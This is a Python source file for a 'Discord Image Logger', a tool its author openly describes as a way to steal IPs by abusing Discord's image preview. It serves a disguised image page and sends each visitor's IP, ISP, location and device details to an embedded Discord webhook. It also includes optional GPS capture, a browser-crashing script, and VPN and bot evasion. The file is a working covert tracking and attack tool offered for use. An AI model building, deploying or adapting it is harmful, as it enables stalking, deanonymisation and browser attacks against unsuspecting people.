# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1336184264303181908/go7voiryln0xiog7cBGMV-mVAhHAFbiYd0Ek2VivbzntBtt_iB6UK9qTIh5PRoPZsSNz",
    "image": "data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEAAkGBwgHBgkIBwgKCgkLDRYPDQwMDRsUFRAWIB0iIiAdHx8kKDQsJCYxJx8fLT0tMTU3Ojo6Iys/RD84QzQ5OjcBCgoKDQwNGg8PGjclHyU3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3N//AABEIAJQAlAMBIgACEQEDEQH/xAAcAAAABwEBAAAAAAAAAAAAAAAAAQIDBAUGBwj/xAA5EAACAQMDAgMGAwcDBQAAAAABAgMABBEFEiExQQYTUQcUImFxgSMykUJSobHB0fAzcuEVNGKi8f/EABcBAAMBAAAAAAAAAAAAAAAAAAABAgP/xAAgEQEBAQADAQACAwEAAAAAAAAAARECITESIkEyUWED/9oADAMBAAIRAxEAPwDhwo6FGKSpBUYoUYFCsFR0YFDpQqLbw5oVzr2oLbQKRGOZZccRrzz/AArYeKPZ4yWjXuitvMUYMlsRgkDqVOf4Vs/B3h5dC0OGNx+PJ+JK2OrH+w4rRQlWI4AI6Uthd/p5nZCjEEEEHBB7URrY+1DQk0bxCZLdNtveJ5sY7A5ww/Wsft+Et88UKnhOKI0dAigYQaKl4ycVq/DPgLU9cgW6crZ2jYKSyjO/6CmixkaOrjxVpcOi6zNp0EhlEAAZ2/aJGf6iqeghUKM0VACjoqOgCoxRCjoMdAUYFH0oVAFTNHiE+rWMLDKvcxqR6gsKiVf+B4BL4nsWf8kTmRvoo/vikeO/3bKrBB2UVA34cFfWot/ebLuENn4hjr1/zmpVrdRrHIWQBh3PTFK9qkyKj2j6A2v+GXltot17Y/jIB1ZP21/Tn7Vw+SNkgG5SPxCOR8hXpaymMTIWI44/3D/5VHrPgXRtVVo0QwISzAxAZGaaNx5+xxntRYzwK7hqPsm0qaBjaXcsTMBt3YIU4+XamdM9lNrbagkt4xeFWztzkHigfUZX2deBG1Zl1TV4mFgpzDGwx7wfX/b/ADrsjW6pBhVVRjGMYAFTFt44wscahI0GFCjAFV3iS5Ft4f1K5DhQkDkMTjHBplrzb4hu/fdb1C5HSW4kYfIbuB+mKrqBOaKghmioGioTR5oUVCgaUKOgKPFC5AFKFFR0l4PFa/2dWkkupzShG8tY9rMOnJHFZFa6f7PUWLw+zKpBkn3E49KMLlci31q4kGtWybvwhgKPTireF2EuXU+Wy4qBe6bHfXKXErsNjbgqng1NgUu2NwAHftUQ7y6xOhlCoqlmynC564/zNTFmk8iSSMElcEr8s1AS2JJcbnRBuOwcjFVh8f2NtqUlgtrHJsX8RSCDjGTz0yB/WqktZ243li/nWkbjBDDNSrY+bH5ZXvVZZ31s9paS2QItXUfUE9jV5ZKpiLlgByST6U8LUC4TanBwP3jWN9pMpbwZqSeZ5SbVXOMkjcCe/WtyslvdJi3mWTaOSKxnjiJU8Ka173tMaRAgEcdegPrTg2Y89NBEx/CuFPycFD/b+NMOjIcMpBp+4WPPmQk7D2J5X5UwWOMZOKATRUeKKmQUKFCgYWKUKSKUKTWBShQoUlDWuhezyY+5zRcAAhjyOv0rnorUeCL/AN2vDG8zKhHI7Gguc6dQ8wBeDj50mAGdz+56U3gFQcZBHQd6dhmEK4jTkVCJ4t9Ilks5gVIMZ6qfT6VB1jwxpks9xe2k5t3nhaB1jjDEoTkgffv17ZpuKaaU8lAexHap9luAbL4OM5AwarjysTy4y+qzQ2l06EWku5IEbKBz0wO9bS1n9+0i4ghcHzEIU/WqeTToL22MN0z7W4EobDA9jnFP6NZXFqi2ZuMiJuJdoDEZyOnfFOWyrn/OcuN7VvgfRNU0PU2gup7q495kZn834kjXnBB7dQMZ6jirD2l6XJqfha7gt2KvwSF/axzWoMiyBiuQAegJrP8Aji/j0/QZzI2NwwDx/WtLdrCTI8vSRtFkSDB6Ypk1Ou4nmuJJEeNtxJ/1lJqNLbyxYMkbKD0OOD9DUNTVFRkUVBBQoUKAUKcxxTWaX2oq+NLHIpaKDkZ5pkGlAkUsaal+QDGeeRVj4aSJrz45Sj9iBn7VWWyzXEgjjyc8ZxnFdH8G+G2hiMt5AjKORIPT0OaJEcuWRpLAFYlQ+gqwMB6j06VXpJtuDtwozgLVxb5IGetRUQxBAsbE7cE0+oeOTfjIHTmpQg3DhfuKfWwdx0yKIVKgR73y9pEa+gOSaktp0lrOlxCcCQ4kXr9DTmm2Rt2LVZtKsaF2IAA5J7VpB92eG+ViIyRkZNct9p+qtOjW6p5sCHYNsjIc+hI457ZGO1SvaF4/FhH7tp5EoY4lZG5X6da5Lqmo3FrrLTrMZUdQwz0dGGcc9v5U04gvaQT7jYSNuHJglwGH0PQ/Tg1Dy8TEDKnPIP8AUVO1LZIwu4BiOQfEPQ9P8+YqHJMZk/EOWHAbuRSUbY7ugAPypNCioMKFChQQUoUgUqgSlCjzSBzVjoumTarei2gxnqee1C9aDwHpi3t7ucsoXvtBX75rryQrDFHawhVUcnYvBP0qs8N6CmkWChipk69MVZxA+duAwevNFuRlb9VJg0lHydgRvTGQasF09YIwZHUAd6es7gOoSXg9iO1TDEQcMA4HOTUK01YRLMcqvwj1FW8UEYAytMwMqKAoAp5riNGwTVRNKeNeijFQNV0xNRtWtzM8TH8rLUmSYv8A6YJoRKwcMx+1EvZ2dPMXjvw+NC1KQGcuXPHBP8en8azl3IZIrbd+ZIyv23Ej+ddx9snh2WWykvbRixUZMfy46VwhlYnkGqonZ+OWSOzYDBR2KnI+Q/4qLS/iKhSTgZwKLY3oaSspNClbG9KHlt6UDKTQpflv+7QoLKUIx604IV+dXr6TcwQljay9eQseSPtVe8oORhl2j4sDP6+lJr1A0zS3vbuOCIElmxnsK7N4a8PW2h6eklxHG8mMggDI+9YrwKqCYXEjqAvqMA1srjU3umKo3w9AM8U5ZIx53alz3zyyZzwDwBUi11JGYCQDI681RSSOqk9MU5bqFC4ABzUWnJGvh1C2yNr7SezirKK6UL8OCG64NYsNkg5wc4FOf9QKnbkgA0afy2/vMRI+IccU215Cj4ZlYH1qo0O5SRiMljVo9tbzCRjGu5Rngc0yzEiPUE4UEZpwXAznNVduuSSy4YdqnKgZcUaLBausV5p0ySRrIAv5T3rzT4ntWstUmBiCxlvh4Az9sCvSEknkvgnj0rjvtE8Lvc6mbqK7j+I8AjoKv2dlxuVzfzl/dxR+aDVo3hq4AYm5jwvXg8UgaF2N9F9qXS5yqArZPUYpcRVmwc4+VS20eKNtsmoRq3oetOxaWkX4kd/jHfilivr/ABHaGAsdjysvYlMH9KFPjTFfJ97dueTtoUYPppNB1G8gkcXMkjRgcHO7H1qzN7aTMrlrMP8AJQSPUH0rFWFzLaXckIyME4OM8f2qBeytDfecjBhnIqc1O46aZ7eWHbEsfl+qrwfuKyN7rM+mXrxh3jxyvOQfnTmnahcSW3OAo67CAMVU+I2DmIbUGDww6kfOp4+q5edNrpHiO11KJVnnjWUcFc7c/rWginjdRsbPH1rj62Ykg3IoV/TNSrPVdQ0nJEm5c8q3IqumeWOtb93IJ44BpUSRyy89ayHhvxTHeHZfFV75/vW+W3jVY7u3+JFI3jtilh6tbSMaaiTMv4Uhxn90/Or2N1nQhQDvXbuFQEaPUrFrZDguvwn0PantHHl2CK7LvU847VUgt0i3CQt5CZd1/M/zpy9u1sojLIdijuab06RJZ5CBxvOTjrXNPav4iuLmMw2Pw2aEqXHVm9R6UFS/Evj6BpJYg4CqCAyctnFRNBu59RtA904KtynxZauWRwzT5KIWA6kdK1ui3zWdiEDsGj+IHPQ5qeXS+HbbTtFBZvNEqsFB3ZXt3HSslHqHml2iSBDG2eY1PHT6+tSG1c39nOd4IfJIAx9QR261SR6ZcxXiNkhSwJAHXnpS4+HfWsa9MsIS4RGCgcsg4+/cVX280W9/dlRU6FABtP0pueW3k0+f8UBQpIIPU88CqXw+8jlwSQgYE/KjvNPrV3ITOQ3IwMcOR/KhWeu9a8m5kjTfhTjr8qOj8i/EmJknkIxiRP4iomr2wdhJBGxz+b5UudmtL1rqMfhyDnPQH0zVjZzi6y7EIVGSuc5o7ncFy9VX6YJjCYyGAHfOKF/aO0fmBVcdwx5HzFWE9xDFwWBJ6YXBqvk8y9fDOUGDnGM4onuj9Ye0dGZN6uDgfDn5dqZ1OPdMFHSU5wP6U5p9pPCzFJiUHPTj61JuI0RopZ0BC9ST0P0o63R3mIkemtBaGcOQO4PatN4Z8bX1rp7WLQCUTMVEjnO1eOMVCtmt7xpYS+4Lzg+vpnvUWSS3jZYoSFEcnQfSj6F461ukeLr2ygkiVxJKAUV2bGP+eauB7RNNstGOI5WvNmwpjjP171y28PlqHiPCLnPrjn+ZpuK4aeIMBnGevanLfU3jGssPaDqkMcwWQeWS2S4HAPasxda1vlbe7lT+XB4X6VEMqXETRIyq54Ax1qB5TRzhJBjnvTk307c8W0d5BLGI0JVVHAPc1GnuDGPKjzux8XNRmCxSllPHfNFHh5RJ3oyaLbi60uLy4W82TZHsyD3BPr6jt96urW9imgG6VPM5CgHnOOP05rK2t3lWhm/K3AI5x61ZWlg0IjdHJTdnbn/2+n9qWDf6Kh0+ad54gMxoxKg8AjPBx+tT4Y7fTlRVbJI5P34qStxHAGlDBSoxkDsen171mtWMnv6q8zbQBtI6Y6/zpT8hb8mrzTZprl5IQGVjnk0KRLHeo2FJZTyCO4o6vtORPtsEIrgMrHaytyCKciX3Z5I4ydoJxk5xQoVnGlUV1I4unJYkhupqRYsWbceuaOhV3xEvaY7MLZiDg9KZ052uA8cp3LkDFChUzxXL0/axi1u0MRILHnPyNRNY4mSUHDvksR3NChTnpXxENzK0JQt8Jqfaf9jj/wAT96FCqvhRXoSLhSDgnFWF6A6RsRzzQoUuXo4+Ky4lZjg0cJ2gY9aFCq/RT+SYiIzruUGrG5ne2stsWAMqw45BxR0Khf6UzXU8kgjaRirEZ59astOiS43LON4Vgoz6ZoqFVfEcfU9yID5SKu1emRQoUKS3/9k=", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
